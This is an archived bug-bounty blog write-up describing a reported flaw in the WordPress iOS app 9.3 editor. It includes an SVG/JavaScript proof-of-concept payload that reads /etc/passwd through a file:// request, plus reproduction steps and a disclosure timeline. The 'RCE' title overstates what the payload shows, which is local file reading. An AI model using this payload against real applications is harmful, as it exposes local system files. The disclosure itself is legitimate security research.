---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-02-21_rce-remote-code-execution-in-wordpress-ios-application-version-93.md
original_filename: 2018-02-21_rce-remote-code-execution-in-wordpress-ios-application-version-93.md
title: '[RCE] Remote Code Execution in Wordpress iOS Application (version 9.3)'
category: documents
detected_topics:
- command-injection
- xss
- mobile-security
tags:
- imported
- documents
- command-injection
- xss
- mobile-security
language: en
raw_sha256: 80ecf2f174a80692520b24d96bc0a969f8bbfef1cde94b75664f68b9ce944fd2
text_sha256: 36b36ddb2e8344e2ba96c5ea7be89eab36cce7d95b651db6bec72384b533bf3e
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# [RCE] Remote Code Execution in Wordpress iOS Application (version 9.3)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-02-21_rce-remote-code-execution-in-wordpress-ios-application-version-93.md
- Source Type: markdown
- Detected Topics: command-injection, xss, mobile-security
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `80ecf2f174a80692520b24d96bc0a969f8bbfef1cde94b75664f68b9ce944fd2`
- Text SHA256: `36b36ddb2e8344e2ba96c5ea7be89eab36cce7d95b651db6bec72384b533bf3e`


## Content

---
title: "[RCE] Remote Code Execution in Wordpress iOS Application (version 9.3)"
page_title: "Evan Ricafort | Blog: [RCE] Remote Code Execution in Wordpress iOS Application (version 9.3)"
url: "https://blog.evanricafort.com/2018/02/rce-remote-code-execution-in-wordpress.html"
final_url: "https://blog.evanricafort.com/2018/02/rce-remote-code-execution-in-wordpress.html"
authors: ["Evan Ricafort (@evanricafort)"]
programs: ["WordPress"]
bugs: ["RCE", "iOS"]
publication_date: "2018-02-21"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5969
---

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqSXs8dcKh4sCY5h-Tvvzo70BPEmSqbdQltjLlJ8r_QKJyiLXHn4gq6w_fHpBvXT-oUy7K6vMLBymUHmA-5WZgi2m7cMKUIwWaP-929l3T94fuSkwdXp8gRTNl7UoinIQEOiNL8jkU/s1600/wordpress-bug.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqSXs8dcKh4sCY5h-Tvvzo70BPEmSqbdQltjLlJ8r_QKJyiLXHn4gq6w_fHpBvXT-oUy7K6vMLBymUHmA-5WZgi2m7cMKUIwWaP-929l3T94fuSkwdXp8gRTNl7UoinIQEOiNL8jkU/s1600/wordpress-bug.png)

  
  
Hello Everyone,  
  
This article will show you how I found a Remote Code Execution Vulnerability in Wordpress iOS Application version 9.3 on my iPod Touch (iOS version 9.3.5).  
  
It was a cold thursday night of February 15 when I was looking for a good program to spend my night with. While checking on [Hackerone](https://hackerone.com/)'s hacktivity page, I found some good stuffs to read and found out that [Wordpress](https://hackerone.com/wordpress) have some newly disclosed reports which gives me a motivation to spend my night on their program.  
  
I fired up my [sublist3r](https://github.com/aboul3la/Sublist3r) to check if there some good subdomains to hunt. after few hours of looking for some vulnerabilities on different subdomains and directories, I didn't find even one so I go to my inbox and check my previous reports on Wordpress. I noticed that I have reported an issue which I found on Wordpress iOS app a year ago.  
  
My previous report gives me another idea so I downloaded the Wordpress iOS app again on my iPod Touch which is stuck on iOS version 9.3.5 since Apple didn't release an update anymore. while downloading the app, it says that the new version of the app is not compatible with my iOS version so I need to download the previous/older version of the app that is compatible for my device. So I download the Wordpress iOS app version 9.3 which is the recommended version from app store for device.  
  
After downloading the app, I found some XSS issues but didn't reported it since it was just a self-XSS. after a few hours of having fun with the app, I found this Remote Code Execution vulnerability on the editor of the app. so below is the proof of concept I reported to wordpress.  
  
  
  
  

_**Proof of Concept**_

  

  

__

> _Hello,_

  

> _I found out that Wordpress IOS Application has a Remote Code Execution when posting a blog via IOS Application._

  

> _Tested in IOS 9.3.5_

  

> _Injected Payload_

  

> _**<?xml version="1.0" encoding="UTF-8" standalone="yes"?>**_**  
> _ <svg xmlns="http://www.w3.org/2000/svg">_****  
> _ <script>_****  
> _function readTextFile(file)_****  
> _{_****  
> _var rawFile = new XMLHttpRequest();_****  
> _rawFile.open("GET", file, false);_****  
> _rawFile.onreadystatechange = function ()_****  
> _{_****  
> _if(rawFile.readyState === 4)_****  
> _{_****  
> _if(rawFile.status === 200 || rawFile.status == 0)_****  
> _{_****  
> _var allText = rawFile.responseText;_****  
> _alert(allText);_****  
> _}_****  
> _}_****  
> _}_****  
> _rawFile.send(null);_****  
> _}  
>  readTextFile("file:///../../../../../etc/passwd");_****  
> _ </script>_****  
> **_** </svg>**_

  

> __  
> 
> 
> * * *
> 
> _Steps  
> 
> 
>  1. Login to your Wordpress account using Wordpress IOS Application
>  2. Create a new blog post
>  3. In the Post body tap the <> button then input the given payload. 
>  4. tap the <> button again and see the result.
> 
_

  

> _I hope you will fix this issue as soon as possible.  
>  Cheers and have a good day,_  
>  _Evan_

  
  
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnB81Ez3fZ98YQ_FpOOZtbA-2rCSf2SyeP5ac-CE9RyN9ZwZ_B8mknSFo6JMY3rcAv0qcydEN7ySVeWJfOsDSLxc-v0ZRPA_BxfAwqrnsMHXfFlXZr8VHPKN9sXFbe6CXD6Tj0j8pL/s1600/28052653_1947576198609137_984925205_n.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnB81Ez3fZ98YQ_FpOOZtbA-2rCSf2SyeP5ac-CE9RyN9ZwZ_B8mknSFo6JMY3rcAv0qcydEN7ySVeWJfOsDSLxc-v0ZRPA_BxfAwqrnsMHXfFlXZr8VHPKN9sXFbe6CXD6Tj0j8pL/s1600/28052653_1947576198609137_984925205_n.jpg)  
---  
Result|  
|  
|  
|  
|  
  
  
  
**Timeline**  
Reported: _February 15, 2018_  
First Response:  ___February 15, 2018_  
Second Response (Marked as Needs more information): _February 15, 2018_  
Third Response (Marked as Informative): _February 21, 2018_ ____  
Final Response (**Hi. Sure, please feel free to publish it on your blog if you'd like**** _._**): _February 21, 2018_ ____  
  
  
  
  
  
  
I hope you enjoy this article.  
  
  
  

Life is a journey that must be traveled no matter how bad the roads and accommodations. Oliver Goldsmith  
Read more at: https://www.brainyquote.com/topics/journey

_**"Life is a journey that must be traveled no matter how bad the roads and accommodations."**  
~ Oliver Goldsmith_****

Life is a journey that must be traveled no matter how bad the roads and accommodations. Oliver Goldsmith  
Read more at: https://www.brainyquote.com/topics/journey

Life is a journey that must be traveled no matter how bad the roads and accommodations. Oliver Goldsmith  
Read more at: https://www.brainyquote.com/topics/journey
